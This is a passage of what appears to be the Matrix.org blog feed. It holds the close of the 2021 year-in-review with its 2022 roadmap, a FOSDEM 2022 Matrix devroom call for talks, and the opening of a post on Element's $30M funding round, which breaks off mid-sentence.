&lt;p&gt;Next up, we’ll be working on building an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3401&quot;&gt;MSC3401&lt;&#x2F;a&gt;-compatible SFU so we can go beyond full mesh (which typically supports a maximum of ~7 callers).  Our candidates right now are mediasoup, ion-sfu, janus and signal-calling-service - we’ll let you know how it goes!  Also, if you’re interested in helping us build this out quicker, we are frantically searching for more WebRTC &amp;amp; VoIP gurus to &lt;a href=&quot;https:&#x2F;&#x2F;apply.workable.com&#x2F;elementio&#x2F;j&#x2F;25BB112FBD&#x2F;&quot;&gt;join the team at Element&lt;&#x2F;a&gt; working on this.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;applications-beyond-chat&quot;&gt;Applications Beyond Chat&lt;&#x2F;h2&gt;
&lt;p&gt;Finally, 2021 was the year where we seriously started building out functionality on Matrix which goes far beyond plain old chat rooms.&lt;&#x2F;p&gt;
&lt;p&gt;Work began in the summer as a research project led by Ryan, formerly tech lead for Element Web - looking at ways to store hierarchical structured data into Matrix while preserving real-time semantics; effectively using Matrix as a collaborative decentralised object tree, providing CRDT (Conflict-free Replicated Data Types) to allow richer applications to be built on Matrix.  This journey led him to create &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;patience&quot;&gt;Patience&lt;&#x2F;a&gt; as a test environment for building out these sort of clients, and meanwhile Timo (famous of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;toger5&#x2F;TheBoard&quot;&gt;The Board&lt;&#x2F;a&gt;) joined the team to build out &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Hsyqa5ozWIo?t=1054&quot;&gt;Full Screen Widgets&lt;&#x2F;a&gt; in Element, providing a much better UI for beyond-chat experiments.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, Matthew Weidner and the Composable Systems Lab at CMU stunned us all by presenting a complete CRDT solution using Matrix named &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;composablesys&#x2F;collabs&quot;&gt;Collabs&lt;&#x2F;a&gt; at &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Exr0iY_D-vw?t=382&quot;&gt;Strange Loop 2021&lt;&#x2F;a&gt;.  This is &lt;em&gt;really&lt;&#x2F;em&gt; impressive stuff - the brave of heart can go and embed a Matrix-powered end-to-end-encrypted collaborative markdown editor straight into Element via Collabs by following the &lt;a href=&quot;https:&#x2F;&#x2F;compoventuals-tests.herokuapp.com&#x2F;&quot;&gt;instructions here&lt;&#x2F;a&gt;.  In practice, Collabs works by serialising the CRDT updates as base64 blobs inside Matrix timeline events (hello &lt;a href=&quot;https:&#x2F;&#x2F;svn.apache.org&#x2F;repos&#x2F;asf&#x2F;incubator&#x2F;wave&#x2F;whitepapers&#x2F;federation&#x2F;wavespec.html#anchor35&quot;&gt;Wave&lt;&#x2F;a&gt;, is that you?), but we’re now investigating how you might reconcile this with maintaining a proper realtime object tree in Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;It’s hard to overstate how powerful storing freeform tree CRDTs in Matrix would be.  It could open up everything from decentralised encrypted collaborative document editing to collaborative whiteboarding and collaborative &lt;a href=&quot;https:&#x2F;&#x2F;figma.com&#x2F;&quot;&gt;Figma&lt;&#x2F;a&gt;-style (or &lt;a href=&quot;https:&#x2F;&#x2F;penpot.app&#x2F;&quot;&gt;Penpot&lt;&#x2F;a&gt;- or &lt;a href=&quot;https:&#x2F;&#x2F;www.blender.org&#x2F;&quot;&gt;Blender&lt;&#x2F;a&gt;-style) design.  You could even start storing an HTML DOM into a room, alongside its binary assets, giving you a multiplayer DOM to build on… and then imagine if you could store the &lt;a href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;WebAssembly&#x2F;Understanding_the_text_format&quot;&gt;syntax tree&lt;&#x2F;a&gt; of the code operating on that DOM alongside it, in the same room.  Before you know it, we will have created kind of some incredible &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Smalltalk&quot;&gt;Smalltalk&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Croquet_Project&quot;&gt;Croquet&lt;&#x2F;a&gt; &#x2F; &lt;a href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Alan_Kay&quot;&gt;Alan Kay&lt;&#x2F;a&gt; nirvana where code is data and data is code and it’s all running live in some kind of decentralised encrypted multiplayer Metaverse :D&lt;&#x2F;p&gt;
&lt;p&gt;While we’ve been looking at storing object trees in Matrix, another obvious angle that has emerged is to use Matrix for encrypted decentralised file storage. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3089&quot;&gt;MSC3089&lt;&#x2F;a&gt; is a proposal on how you might represent hierarchies of files in Matrix - where each room acts effectively as a directory of files, with spaces forming a directory structure (much as they do already in today’s Matrix), leveraging Matrix’s existing decentralised access control mechanisms to control who can access what.  Combine such a file storage system with the collaborative editing capabilities mentioned above, and suddenly a really exciting proposition starts to emerge.  We’re investigating this right now, and all will be revealed early next year…&lt;&#x2F;p&gt;
&lt;p&gt;Finally, and last but not least, Robert Long has been building on top of our shiny new Native Matrix Voice&#x2F;Video Conferencing capabilities to use Matrix as the communication backbone for a truly open, equitable and interoperable vision of the Metaverse.  The best way of describing it is to look at his awesome &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=e26UJRCGfGk&amp;amp;t=2263s&quot;&gt;Third Room demo from the Open Metaverse Interoperability Group demo session&lt;&#x2F;a&gt; in September:&lt;&#x2F;p&gt;
&lt;iframe src=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;e26UJRCGfGk?t=2263s&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;&#x2F;iframe&gt;
&lt;p&gt;Now, some folks will recall that since day one (in fact, since before day one) the hope for Matrix was that it might end up as the communications fabric of the Metaverse.  We were about 4 years early when we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;04&#x2F;04&#x2F;opening-up-cyberspace-with-matrix-and-webvr&quot;&gt;first starting enthusing about this&lt;&#x2F;a&gt;, and then still ahead of our time when we did the world’s first &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;02&#x2F;05&#x2F;3-d-video-calling-with-matrix-webrtc-and-webvr-at-fosdem-2018&quot;&gt;3D Video calling&lt;&#x2F;a&gt; over Matrix.  However, it now feels like the world has finally caught up - and we’re in grave danger of being overtaken by a dystopia where the big tech companies balkanize the Metaverse into a series of closed proprietary user-exploiting walled gardens, much like today’s incumbent chat silos - but even worse.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;This is our chance to fix it before it’s too late&lt;&#x2F;strong&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;careers&quot;&gt;Element is funding a small but highly targeted team&lt;&#x2F;a&gt; to focus exclusively on building out open interoperable Metaverse over Matrix - ensuring that collaboration in 3D (and 2D) spatial environments in future is decentralised, secure and standards-based.  This obviously ties in directly with the rest of the Beyond Chat projects listed above: it’s early days, but it’s incredibly exciting to imagine where we could end up if this works!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, a question which has kept coming up while working on Beyond Chat projects has been whether to implement this new functionality as Matrix widgets, bake them into existing Matrix clients, or build them as domain-specific dedicated Matrix clients.  But perhaps we’re thinking about this all wrong: what if your Matrix client was just a browser for Matrix rooms?  Some of these could be chatrooms.  Some of these could be VoIP&#x2F;Video conferences or Discord-style voice&#x2F;video rooms.  Some of these could be message boards or mailing lists.  Some of these could be collaborative editors or whiteboards.  Some of these could be 3D views into the metaverse.  Some of these could be rendered via widgets; some could be rendered natively if the client knows how.  And some of these could even be good old web pages(!!!).&lt;&#x2F;p&gt;
&lt;p&gt;Imagine if your Matrix client was effectively a genuine browser of arbitrary decentralised realtime content?  If your view into a Matrix room was just that: a full window view into that room, be it textual or 2D or 3D - and your Matrix client was just a browser which added the necessary chrome and navigation to help you tab between rooms, login and logout, manage your encryption, track who’s in the room, track your notifications, etc.?&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, if you’re in a web browser, you might hop into a lightweight single-page domain-specific webapp which happens to use Matrix for collaboration.  Or if you’re in a Matrix client&#x2F;browser, you could hop to the same matrix URL to get at the same functionality with all the supporting chrome and UI overlays sliding in as needed…&lt;&#x2F;p&gt;
&lt;p&gt;Perhaps the vision of Matrix as the missing communication layer of the open Web is more literal than we ever thought.  Eitherway, it will be fascinating to see how Applications Beyond Chat evolves over the next year.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;2022&quot;&gt;2022&lt;&#x2F;h2&gt;
&lt;p&gt;Now, I dare you to cross-reference all of the above with &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special-2020#2021&quot;&gt;last year’s predictions for 2021&lt;&#x2F;a&gt; to see how we did :D In practice, the only things from the list we haven’t got to are peeking-over-federation (although arguably fast joins are a key part of that), account portability, and restoring incremental sign-up (although our new clients have it!).&lt;&#x2F;p&gt;
&lt;p&gt;So, here go the predictions for 2022 (keeping it short, otherwise it’ll be 2023 before this blog post gets finished…):&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Client polish and performance&lt;&#x2F;strong&gt; - our prime directive is to ensure that Matrix clients can be built with UX polish and quality which exceeds our centralised alternatives.  In practice, this means:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Element must spark joy&lt;&#x2F;strong&gt;.  Ensuring Element’s Information Architecture continues to be simplified and refined, and that &lt;em&gt;nobody&lt;&#x2F;em&gt; who knows how to use a computer hits a WTF moment when first using the app.  Never again do we want to see someone on Twitter saying “I have no idea how to use Matrix”.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Instant launch&lt;&#x2F;strong&gt;.  With Sync v3 and matrix-rust-sdk we hope to make Element launch instantly on all platforms - including initial sync.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Fast joins&lt;&#x2F;strong&gt;.  We should never get bored while waiting to join a room or accept an invite.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Spaces&lt;&#x2F;strong&gt;.  While Spaces are already a huge improvement in letting users organise and discover rooms, there’s still much more to be done:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Flair&lt;&#x2F;strong&gt; - Users who are members of a space should be able to announce it loud and proud with a Flair badge on their avatar, like we used to with the old pre-spaces Communities feature (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3219&quot;&gt;MSC3219&lt;&#x2F;a&gt; being the potential proposal).&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Synchronising access controls&lt;&#x2F;strong&gt; - You should be able to apply access controls based on whether a user is a member of a given group (so that if you invite them to #moderators:example.com, they automatically get made moderator in all the rooms in a given space).  It looks likely that this will be implemented at last using joepie91’s &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3216&quot;&gt;MSC3216&lt;&#x2F;a&gt; proposal for Synchronized access control for Spaces (rather than Matthew’s original &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2962&quot;&gt;MSC2962&lt;&#x2F;a&gt; - an excellent example of the community steering the spec process :)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Bulk joins&lt;&#x2F;strong&gt; - It should be a one-button operation to join all the rooms in a space.&lt;&#x2F;li&gt;
&lt;li&gt;**Subspaces **- as more and more spaces emerge, the ability to navigate them as a hierarchy becomes more and more useful.  We want to get to the point where we can turn off the Matrix.org public rooms list, and instead present a Space tree of all the good rooms we know about in Matrix… delegating over curation to the wider community; building a huge USENET-style hierarchy of where to go in Matrix.  To do that, we need subspaces to sing!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Removing communities&#x2F;groups&lt;&#x2F;strong&gt;, which will then be entirely superseded by spaces.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;**Threads **go-live!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Location share&lt;&#x2F;strong&gt; go-live&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Pinned messages&lt;&#x2F;strong&gt;, so the most important messages are always visible to everyone n the room&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Starred messages&lt;&#x2F;strong&gt;, so you never lose a message ever again&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Custom emoji&lt;&#x2F;strong&gt;, finally merging in all the custom emoji work from the community.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;matrix-rust-sdk&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Element iOS on rust-sdk&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Element Android on rust-sdk-crypto&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;…and experiment to see how matrix-rust-sdk feels on Web? It’s a real shame that &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;daydream-mx&#x2F;Daydream&quot;&gt;Daydream&lt;&#x2F;a&gt; got archived…&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Encryption&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Vodozemac&lt;&#x2F;strong&gt; in matrix-rust-sdk, maybe even elsewhere.&lt;&#x2F;li&gt;
&lt;li&gt;**Updated E2EE Audit **spanning vodozemac, olm+megolm, matrix-rust-sdk… and a representative sample of a typical Element+Synapse deployment.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;DMLS&lt;&#x2F;strong&gt; - getting to the point where we can experiment with it in real clients.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Encryption Agility&lt;&#x2F;strong&gt; - the ability to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;issues&#x2F;3516&quot;&gt;migrate encrypted history&lt;&#x2F;a&gt; is going to become really important as we evolve our E2EE, whether that’s by adding in post-quantum algorithms, or moving from Megolm to MLS, or any other shifts.  We will need to start thinking about it in 2022.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Next-generation MSCs&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Aggregations&lt;&#x2F;strong&gt; - finalising the foundational MSCs for aggregations, at last&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Extensible events&lt;&#x2F;strong&gt; - finalising the foundational MSCs for extensible events, at last&lt;&#x2F;li&gt;
&lt;li&gt;**Sync v3 **- finalising the MSC and implementing it in matrix-rust-sdk&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Fast joins&lt;&#x2F;strong&gt; - getting them implemented in Synapse and Dendrite&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Peeking over federation&lt;&#x2F;strong&gt; - getting them implemented in Synapse and Dendrite&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Extensible profiles&lt;&#x2F;strong&gt; - who needs a facebook wall when you have a profile room on Matrix?&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Open ID Connect&lt;&#x2F;strong&gt; - using OIDC as an alternative auth mechanism for new clients.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Gitter parity&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Importing the Gitter archives into Matrix&lt;&#x2F;strong&gt; via &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;2716&quot;&gt;MSC2716&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Implementing excellent public static Matrix archives&lt;&#x2F;strong&gt; (replacing both view.matrix.org and gitter.im’s static views)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Transfiguring Gitter into a Gitter-themed Element&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Dendrite&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;**Parity with Synapse **- and out of beta, with any luck!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;P2P Matrix&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Exposing the normal Matrix network via P2P!&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Multihomed accounts&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Store and forward&lt;&#x2F;strong&gt; (if only by relaying via other P2P Matrix nodes)&lt;&#x2F;li&gt;
&lt;li&gt;**Low bandwidth transports **- via PineCoAP or similar&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Making federation robust in a highly disconnected network.&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Hydrogen&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;**Daily Driver **- making sure that Hydrogen can be readily used as a daily driver Matrix client, even if it lacks full parity with Element.&lt;&#x2F;li&gt;
&lt;li&gt;**Embeddable Hydrogen **- making the most of Hydrogen as a tiny lightweight PWA to embed it into existing websites.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Bots and Bridges&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;**Landing End-to-Bridge-Encryption **for all existing matrix-appservice-bridge based bridges&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;All the integrations!&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;First-class UI for configuring integrations!&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Trust &amp;amp; Safety&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Empower users to manage abuse within their communities&lt;&#x2F;strong&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Native Group Voice&#x2F;Video Conferencing&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Launch a standalone conferencing app!&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Build a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;3401&quot;&gt;MSC3401&lt;&#x2F;a&gt;-capable SFU&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Add native group calling to Element&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Border gateways&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;Something we didn’t mention in 2021 is the increasing interest in building border gateways and hardware cross domain gateways to safely link different Matrix federations together.  We expect to see a lot of activity in this space in 2022, and there should be some new MSCs too :)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Beyond Chat&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;**Metaverse on Matrix **- building out the dream as per above!&lt;&#x2F;li&gt;
&lt;li&gt;**Collaborative editing **- extending Matrix to store trees of events, and collaborate on them in realtime - starting with a collaborative editor!&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;File storage in Matrix&lt;&#x2F;strong&gt; - building out real-life file storage on top of Matrix.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;So, there you have it. If you’ve got this far… it’s incredible; you’re amazing: thank you for reading!  The sheer length of this update shows just how much Matrix has grown in 2021 relative to previous years; it’s frankly terrifying to imagine how long the equivalent post will be next year.  We may have to change the format a little :)&lt;&#x2F;p&gt;
&lt;p&gt;And that’s a wrap for 2021: we hope you stay safe and have an excellent end of the year.  Huge thanks for flying Matrix and supporting the project - we literally wouldn’t be here without you.&lt;&#x2F;p&gt;
&lt;p&gt;- Matthew, Amandine &amp;amp; the whole Matrix core team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Call for Participation for the FOSDEM 2022 Matrix Dev Room!</title>
        <published>2021-12-02T00:00:00+00:00</published>
        <updated>2021-12-02T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/12/02/call-for-participation-for-the-fosdem-2022-matrix-dev-room/" type="text/html"/>
        <id>https://matrix.org/blog/2021/12/02/call-for-participation-for-the-fosdem-2022-matrix-dev-room/</id>
        
        <content type="html">&lt;h2 id=&quot;a-full-day-of-matrix-talks&quot;&gt;A full day of Matrix talks&lt;&#x2F;h2&gt;
&lt;p&gt;This year, the Matrix.org Foundation is excited to host the first ever &lt;em&gt;Matrix.org Foundation and Community&lt;&#x2F;em&gt; devroom at FOSDEM. A full day of talks, demos and workshops around Matrix itself and projects built on top of Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Matrix is the open source project that publishes the Matrix open standard for secure, decentralised, real-time communication, and its Apache licensed reference implementations.&lt;&#x2F;p&gt;
&lt;p&gt;We encourage people working on the Matrix protocol or building on it in an open source project to submit a proposal! Note that companies are welcome to talk about the Matrix details of their open source projects, but marketing talks are not welcome.&lt;&#x2F;p&gt;
&lt;p&gt;We want this devroom to be a space where the Matrix community can show its work, where developers can talk about the challenges they faced and how they overcame them, and where people can get a glimpse of the future of the Matrix protocol and ecosystem.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;talk-details&quot;&gt;Talk Details&lt;&#x2F;h2&gt;
&lt;p&gt;The talks will be pre-recorded in January. They will be played during FOSDEM, followed by a session of live Q&amp;amp;A depending on the format. During the playback of the talk, people will be able to comment and ask questions in the chat (via Matrix!).&lt;&#x2F;p&gt;
&lt;p&gt;The talks can follow one of three formats:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;5 min lightning talk, ideal to showcase your project and make people want to have a look at it&lt;&#x2F;li&gt;
&lt;li&gt;20 min talk + 10 min Q&amp;amp;A, for topics that can be covered briefly&lt;&#x2F;li&gt;
&lt;li&gt;50 min talk + 10 min Q&amp;amp;A for more complex subjects which need more focus&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We strongly encourage you to prepare a demo when it makes sense, so people can actually see what your work looks like in practice!&lt;&#x2F;p&gt;
&lt;p&gt;Of course, the proposal must respect the FOSDEM terms as well:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The conference language is English. All content must relate to Free and Open Source Software. By participating in the event you agree to the publication of your recordings, slides and other content provided under the same licence as all FOSDEM content (CC-BY).&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;submitting-a-proposal&quot;&gt;Submitting a Proposal&lt;&#x2F;h2&gt;
&lt;p&gt;Proposals must be &lt;a href=&quot;https:&#x2F;&#x2F;penta.fosdem.org&#x2F;submission&#x2F;FOSDEM22&quot;&gt;submitted on FOSDEM&#x27;s conference management system Pentabarf&lt;&#x2F;a&gt; before December 17th 2021. If you are not used to Pentabarf, you can follow this &lt;a href=&quot;https:&#x2F;&#x2F;eyskens.me&#x2F;beginners-guide-to-pentabarf&#x2F;&quot;&gt;beginners guide to Pentabarf&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We expect to receive more requests than we have slots available. The devroom organisers (two community members and one core team rep) will be reviewing the proposals and accepting them based on the potential positive impact the project has on Matrix (as defined in by the Mission section of https:&#x2F;&#x2F;matrix.org&#x2F;foundation).&lt;&#x2F;p&gt;
&lt;p&gt;If a project proposal has been turned down, it doesn&#x27;t mean we don&#x27;t believe it has good potential. Maintainers are invited to join the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#twim:matrix.org&quot;&gt;#twim:matrix.org&lt;&#x2F;a&gt; Matrix room to give it some visibility.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Element raises $30M to boost Matrix</title>
        <published>2021-07-27T00:00:00+00:00</published>
        <updated>2021-07-27T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2021/07/27/element-raises-30m-to-boost-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2021/07/27/element-raises-30m-to-boost-matrix/</id>
        
        <content type="html">&lt;p&gt;Hi folks,&lt;&#x2F;p&gt;
&lt;p&gt;Big news today: Element, the startup founded by the team who created Matrix,
just raised $30M of Series B funding in order to further accelerate Matrix
development and improve Element, the flagship Matrix app. The round is led by
our friends at &lt;a href=&quot;https:&#x2F;&#x2F;protocol.ai&quot;&gt;Protocol Labs&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;metaplanet.com&quot;&gt;Metaplanet&lt;&#x2F;a&gt;,
the fund established by Jaan Tallinn (co-founder of
Skype and Kazaa).  Both Protocol Labs and Metaplanet are spectacularly on
board our decentralised communication quest, and you couldn&#x27;t really ask for
a better source of funding to help take Matrix to the next level.  Thank you
for believing in Matrix and leading Element&#x27;s latest funding!&lt;&#x2F;p&gt;
&lt;p&gt;You can read all about it from the Element perspective over at the
&lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;element-raises-30m-as-matrix-explodes&quot;&gt;Element Blog&lt;&#x2F;a&gt;,
but suffice it to say that this is enormous news for the Matrix ecosystem as a
whole.  In addition to transforming the Element app, on the Matrix side this
means that there is now concrete funding secured to:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;finish building out &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;05&#x2F;06&#x2F;introducing-the-pinecone-overlay-network&quot;&gt;P2P Matrix&lt;&#x2F;a&gt;
and get it live (including finishing Dendrite, given our P2P work builds on Dendrite!)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;implement &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1419820122143961093&quot;&gt;native decentralised E2EE voip&#x2F;video conferencing&lt;&#x2F;a&gt; for Matrix&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;fully build out our
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2020&#x2F;10&#x2F;19&#x2F;combating-abuse-in-matrix-without-backdoors&quot;&gt;relative decentralised reputation system&lt;&#x2F;a&gt;
in order to combat abuse in Matrix.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Obviously this is in addition to all the normal business-as-usual work going
on in terms of:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;getting &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;spaces-the-next-frontier&#x2F;&quot;&gt;Spaces&lt;&#x2F;a&gt; out of beta&lt;&#x2F;li&gt;
&lt;li&gt;adding Threading to Element (yes, it&#x27;s finally happening!)&lt;&#x2F;li&gt;
&lt;li&gt;speeding up room joins over federation&lt;&#x2F;li&gt;
&lt;li&gt;creating &#x27;sync v3&#x27; to lazy-load all content and make the API super-snappy&lt;&#x2F;li&gt;
&lt;li&gt;lots of little long-overdue fun bits and pieces (yes, custom emoji, we&#x27;re looking at you).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;If you&#x27;re wondering whether Protocol Labs&#x27; investment means that we&#x27;ll be
seeing more overlap between &lt;a href=&quot;https:&#x2F;&#x2F;ipfs.io&quot;&gt;IPFS&lt;&#x2F;a&gt; and Matrix, then yes -
where it makes tech sense to do so, we&#x27;re hoping to work more closely
together; for instance collaborating with the libp2p team on our P2P work
(we still need to experiment properly with gossipsub!), or perhaps giving
